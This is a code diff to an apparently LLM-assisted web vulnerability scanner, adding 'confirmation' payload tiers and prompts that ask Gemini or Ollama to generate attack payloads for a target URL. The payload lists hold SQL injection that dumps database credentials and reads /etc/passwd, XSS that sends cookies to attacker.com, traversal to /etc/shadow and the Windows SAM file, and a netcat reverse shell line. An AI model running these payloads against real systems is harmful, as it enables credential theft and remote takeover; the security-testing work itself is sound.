@@ -27,6 +27,10 @@ class LLMClient:
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Analyze response to determine if vulnerability exists and suggest next steps"""
         raise NotImplementedError
+    
+    async def generate_confirmation_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate confirmation payloads for 100% verification"""
+        raise NotImplementedError
 
 class BasicClient(LLMClient):
     """Basic client that works without AI - uses predefined payloads"""
@@ -53,6 +57,14 @@ class BasicClient(LLMClient):
                     "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                     "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                     "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
+                ],
+                'confirmation': [
+                    "' UNION SELECT CONCAT(user,':',password) FROM mysql.user--",
+                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+                    "' UNION SELECT database(),user(),version()--",
+                    "'; WAITFOR DELAY '00:00:05'--",
+                    "' AND (SELECT SLEEP(5))--",
+                    "' UNION SELECT LOAD_FILE('/etc/passwd')--"
                 ]
             },
             'xss': {
@@ -73,6 +85,13 @@ class BasicClient(LLMClient):
                     "<svg><script>alert('XSS')</script></svg>",
                     "<iframe srcdoc='<script>parent.alert(`XSS`)</script>'>",
                     "<object data='data:text/html,<script>alert(`XSS`)</script>'>"
+                ],
+                'confirmation': [
+                    "<script>document.body.innerHTML='<h1>XSS CONFIRMED</h1>'</script>",
+                    "<img src=x onerror=document.location='http://attacker.com/'+document.cookie>",
+                    "<script>fetch('http://attacker.com',{method:'POST',body:document.cookie})</script>",
+                    "<svg/onload=eval(atob('YWxlcnQoJ1hTUyBDb25maXJtZWQnKQ=='))>",
+                    "<iframe src='data:text/html,<script>top.location=\"http://attacker.com\"</script>'>"
                 ]
             },
             'path_traversal': {
@@ -90,6 +109,14 @@ class BasicClient(LLMClient):
                     "/var/www/../../etc/passwd%00.jpg",
                     "../../../../../../../etc/passwd%00",
                     "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts%00.txt"
+                ],
+                'confirmation': [
+                    "file:///etc/passwd",
+                    "../../../../../../../etc/shadow",
+                    "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
+                    "/proc/self/environ",
+                    "../../../../../../../var/log/apache2/access.log",
+                    "php://filter/read=convert.base64-encode/resource=/etc/passwd"
                 ]
             },
             'command_injection': {
@@ -110,6 +137,14 @@ class BasicClient(LLMClient):
                     "| nc -e /bin/sh attacker.com 4444",
                     "; python -c 'import os; os.system(\"id\")'",
                     "& powershell -c Get-Process"
+                ],
+                'confirmation': [
+                    "; echo 'COMMAND_INJECTION_CONFIRMED'",
+                    "| echo $(id)",
+                    "; cat /etc/passwd | head -5",
+                    "& echo %USERNAME%_%COMPUTERNAME%",
+                    "; ps aux | grep root",
+                    "| ls -la /tmp && echo 'CMD_CONFIRMED'"
                 ]
             },
             'idor': {
@@ -130,6 +165,14 @@ class BasicClient(LLMClient):
                     "/api/user/1/sensitive",
                     "?id=1&force=true",
                     "/admin/user/1/privileges"
+                ],
+                'confirmation': [
+                    "?id=0",
+                    "?user_id=999999",
+                    "/api/admin/users/all",
+                    "?id[]=1&id[]=2&id[]=3",
+                    "/user/../admin/config",
+                    "?id=1&debug=true&admin=1"
                 ]
             }
         }
@@ -229,6 +272,11 @@ class BasicClient(LLMClient):
         payloads = self.basic_payloads.get(vulnerability_type, {})
         return payloads.get(level, payloads.get('basic', []))
     
+    async def generate_confirmation_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate confirmation payloads for 100% verification"""
+        payloads = self.basic_payloads.get(vulnerability_type, {})
+        return payloads.get('confirmation', [])
+    
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Basic response analysis without AI"""
         response_text = response_data.get('response_text', '').lower()
@@ -247,6 +295,11 @@ class BasicClient(LLMClient):
                     vulnerability_indicators.append(f"SQL error detected: {error}")
                     confidence += 0.3
             
+            # Check for time-based indicators
+            if response_time > 5:
+                vulnerability_indicators.append("Potential time-based SQL injection (slow response)")
+                confidence += 0.4
+            
             if status_code == 500:
                 vulnerability_indicators.append("Internal server error - possible SQL injection")
                 confidence += 0.2
@@ -259,34 +312,56 @@ class BasicClient(LLMClient):
             if '<script>' in response_text and 'alert' in response_text:
                 vulnerability_indicators.append("JavaScript execution context detected")
                 confidence += 0.5
+            
+            if 'xss confirmed' in response_text:
+                vulnerability_indicators.append("XSS confirmation message found")
+                confidence += 0.8
         
         elif vulnerability_type == 'path_traversal':
-            file_indicators = ['root:', '[boot loader]', 'windows', 'etc/passwd']
+            file_indicators = ['root:', '[boot loader]', 'windows', 'etc/passwd', 'daemon:', 'bin:', 'sys:']
             for indicator in file_indicators:
                 if indicator in response_text:
                     vulnerability_indicators.append(f"File system access detected: {indicator}")
                     confidence += 0.4
         
         elif vulnerability_type == 'command_injection':
-            command_indicators = ['uid=', 'gid=', 'windows', 'total ', 'drwx']
+            command_indicators = ['uid=', 'gid=', 'windows', 'total ', 'drwx', 'command_injection_confirmed']
             for indicator in command_indicators:
                 if indicator in response_text:
                     vulnerability_indicators.append(f"Command execution detected: {indicator}")
                     confidence += 0.4
         
-        # Determine next testing level
-        if confidence > 0.3:
-            next_level = 'intermediate'
-        if confidence > 0.6:
-            next_level = 'advanced'
+        # Determine next testing level based on confidence
+        if confidence > 0.8:
+            next_level = 'confirmation'  # High confidence - need final confirmation
+        elif confidence > 0.6:
+            next_level = 'advanced'     # Medium-high confidence - try advanced
+        elif confidence > 0.3:
+            next_level = 'intermediate' # Some confidence - try intermediate
+        else:
+            next_level = 'none'         # No confidence - stop testing
         
         return {
             'vulnerable': confidence > 0.3,
             'confidence': min(confidence, 1.0),
             'indicators': vulnerability_indicators,
             'next_level': next_level,
-            'recommended_action': 'manual_verification' if confidence > 0.5 else 'continue_testing'
+            'recommended_action': self._get_recommended_action(confidence),
+            'needs_confirmation': confidence > 0.7
         }
+    
+    def _get_recommended_action(self, confidence: float) -> str:
+        """Get recommended action based on confidence level"""
+        if confidence > 0.9:
+            return 'confirmed_vulnerable'
+        elif confidence > 0.7:
+            return 'needs_final_confirmation'
+        elif confidence > 0.5:
+            return 'manual_verification'
+        elif confidence > 0.3:
+            return 'continue_testing'
+        else:
+            return 'not_vulnerable'
 
 class GeminiClient(LLMClient):
     """Gemini API client for vulnerability analysis and payload generation"""
@@ -391,6 +466,7 @@ class GeminiClient(LLMClient):
         - basic: Simple, common payloads for initial testing
         - intermediate: More sophisticated payloads with encoding/bypasses
         - advanced: Complex payloads for deep testing and confirmation
+        - confirmation: Ultra-specific payloads for 100% verification
         
         Requirements for {level} level:
         1. Generate 8-12 diverse payloads specifically for {vulnerability_type}
@@ -412,6 +488,38 @@ class GeminiClient(LLMClient):
             return payloads if isinstance(payloads, list) else []
         except json.JSONDecodeError:
             logger.error(f"Failed to parse {vulnerability_type} payloads from Gemini")
+            return []
+    
+    async def generate_confirmation_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate confirmation payloads for 100% verification"""
+        prompt = f"""
+        Generate CONFIRMATION payloads for {vulnerability_type} to achieve 100% verification.
+        
+        Target: {target_info.get('url', 'unknown')}
+        Previous Results: {json.dumps([r.get('indicators', []) for r in previous_results[-3:]], indent=2)}
+        
+        Based on previous indicators, create 6-8 payloads that will:
+        1. Definitively confirm the {vulnerability_type} vulnerability
+        2. Provide clear, unambiguous evidence
+        3. Be safe for testing (no destructive operations)
+        4. Use advanced techniques for bypass/confirmation
+        
+        For SQL Injection: Use time delays, information extraction, version detection
+        For XSS: Use unique identifiers, DOM manipulation, data exfiltration simulation
+        For Path Traversal: Target specific system files, use encoding bypasses
+        For Command Injection: Use unique echo commands, environment variable access
+        For IDOR: Test boundary conditions, privilege escalation attempts
+        
+        Respond with ONLY a JSON array:
+        ["confirmation_payload1", "confirmation_payload2", ...]
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            payloads = json.loads(response)
+            return payloads if isinstance(payloads, list) else []
+        except json.JSONDecodeError:
+            logger.error(f"Failed to parse confirmation payloads from Gemini")
             return []
     
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
@@ -436,8 +544,9 @@ class GeminiClient(LLMClient):
         1. Is this endpoint vulnerable to {vulnerability_type}? (true/false)
         2. Confidence level (0.0-1.0)
         3. Specific vulnerability indicators found
-        4. What testing level should be used next (basic/intermediate/advanced/none)
-        5. Recommended next action
+        4. What testing level should be used next (basic/intermediate/advanced/confirmation/none)
+        5. Does this need final confirmation? (true/false)
+        6. Recommended next action
         
         Look for:
         - Error messages indicating {vulnerability_type}
@@ -446,14 +555,23 @@ class GeminiClient(LLMClient):
         - Status code anomalies
         - Response time variations
         - Content changes
+        - Unique confirmation markers
+        
+        Confidence Scoring:
+        - 0.9-1.0: Definitely vulnerable (confirmed)
+        - 0.7-0.9: Very likely vulnerable (needs confirmation)
+        - 0.5-0.7: Possibly vulnerable (continue testing)
+        - 0.3-0.5: Weak indicators (try advanced)
+        - 0.0-0.3: Not vulnerable
         
         Respond in JSON format:
         {{
             "vulnerable": true/false,
             "confidence": 0.0-1.0,
             "indicators": ["list of specific indicators found"],
-            "next_level": "basic/intermediate/advanced/none",
-            "recommended_action": "continue_testing/manual_verification/confirmed_vulnerable/not_vulnerable",
+            "next_level": "basic/intermediate/advanced/confirmation/none",
+            "needs_confirmation": true/false,
+            "recommended_action": "continue_testing/manual_verification/needs_final_confirmation/confirmed_vulnerable/not_vulnerable",
             "explanation": "detailed analysis of the response"
         }}
         """
@@ -463,7 +581,7 @@ class GeminiClient(LLMClient):
             return json.loads(response)
         except json.JSONDecodeError:
             logger.error("Failed to parse vulnerability analysis from Gemini")
-            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}
+            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none", "needs_confirmation": False}
 
 class OllamaClient(LLMClient):
     """Ollama client for local LLM analysis"""
@@ -567,6 +685,33 @@ class OllamaClient(LLMClient):
             logger.error(f"Failed to parse {vulnerability_type} payloads from Ollama")
             return []
     
+    async def generate_confirmation_payload(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict]) -> List[str]:
+        """Generate confirmation payloads using Ollama"""
+        prompt = f"""
+        Generate CONFIRMATION payloads for {vulnerability_type}:
+        URL: {target_info.get('url')}
+        Previous findings: {[r.get('indicators', []) for r in previous_results[-2:]]}
+        
+        Create 6-8 confirmation payloads that will definitively prove the vulnerability exists.
+        Focus on clear, unambiguous evidence generation.
+        
+        Return JSON array: ["payload1", "payload2", ...]
+        """
+        
+        response = await self.generate_response(prompt)
+        try:
+            start = response.find('[')
+            end = response.rfind(']') + 1
+            if start != -1 and end != -1:
+                json_str = response[start:end]
+                payloads = json.loads(json_str)
+                return payloads if isinstance(payloads, list) else []
+            else:
+                return []
+        except json.JSONDecodeError:
+            logger.error(f"Failed to parse confirmation payloads from Ollama")
+            return []
+    
     async def analyze_vulnerability_response(self, response_data: Dict, payload: str, vulnerability_type: str) -> Dict:
         """Analyze response using Ollama"""
         prompt = f"""
@@ -580,9 +725,10 @@ class OllamaClient(LLMClient):
         1. Is it vulnerable? (true/false)
         2. Confidence (0.0-1.0)
         3. Indicators found
-        4. Next testing level (basic/intermediate/advanced/none)
+        4. Next testing level (basic/intermediate/advanced/confirmation/none)
+        5. Needs confirmation? (true/false)
         
-        Respond in JSON: {{"vulnerable": bool, "confidence": float, "indicators": [], "next_level": "string"}}
+        Respond in JSON: {{"vulnerable": bool, "confidence": float, "indicators": [], "next_level": "string", "needs_confirmation": bool}}
         """
         
         response = await self.generate_response(prompt)
@@ -591,12 +737,15 @@ class OllamaClient(LLMClient):
             json_end = response.rfind('}') + 1
             if json_start != -1 and json_end != -1:
                 json_str = response[json_start:json_end]
-                return json.loads(json_str)
+                result = json.loads(json_str)
+                # Ensure all required fields exist
+                result.setdefault('needs_confirmation', result.get('confidence', 0) > 0.7)
+                return result
             else:
-                return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}
+                return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none", "needs_confirmation": False}
         except json.JSONDecodeError:
             logger.error("Failed to parse vulnerability analysis from Ollama")
-            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}
+            return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none", "needs_confirmation": False}
 
 class LLMManager:
     """Manages multiple LLM clients and provides unified interface"""
@@ -674,6 +823,28 @@ class LLMManager:
         logger.error("All LLM clients failed to generate payloads")
         return []
     
+    async def generate_confirmation_payloads_with_fallback(self, vulnerability_type: str, target_info: Dict, previous_results: List[Dict], preference: str = "gemini") -> List[str]:
+        """Generate confirmation payloads with fallback"""
+        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
+        
+        for client_name in client_order:
+            if client_name in self.clients:
+                try:
+                    logger.info(f"Generating {vulnerability_type} confirmation payloads with {client_name}")
+                    if hasattr(self.clients[client_name], 'generate_confirmation_payload'):
+                        payloads = await self.clients[client_name].generate_confirmation_payload(vulnerability_type, target_info, previous_results)
+                    else:
+                        # Fallback to advanced level payloads
+                        payloads = await self.clients[client_name].generate_payload(vulnerability_type, target_info, 'advanced')
+                    if payloads:
+                        return payloads
+                except Exception as e:
+                    logger.error(f"Confirmation payload generation failed with {client_name}: {str(e)}")
+                    continue
+        
+        logger.error("All LLM clients failed to generate confirmation payloads")
+        return []
+    
     async def analyze_vulnerability_response_with_fallback(self, response_data: Dict, payload: str, vulnerability_type: str, preference: str = "gemini") -> Dict:
         """Analyze vulnerability response with fallback"""
         client_order = [preference] + [k for k in self.clients.keys() if k != preference]
@@ -684,9 +855,12 @@ class LLMManager:
                     logger.info(f"Analyzing response with {client_name}")
                     result = await self.clients[client_name].analyze_vulnerability_response(response_data, payload, vulnerability_type)
                     if result:
+                        # Ensure all required fields exist
+                        result.setdefault('needs_confirmation', result.get('confidence', 0) > 0.7)
+                        result.setdefault('recommended_action', 'continue_testing')
                         return result
                 except Exception as e:
                     logger.error(f"Response analysis failed with {client_name}: {str(e)}")
                     continue
         
-        return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none"}
+        return {"vulnerable": False, "confidence": 0.0, "indicators": [], "next_level": "none", "needs_confirmation": False}
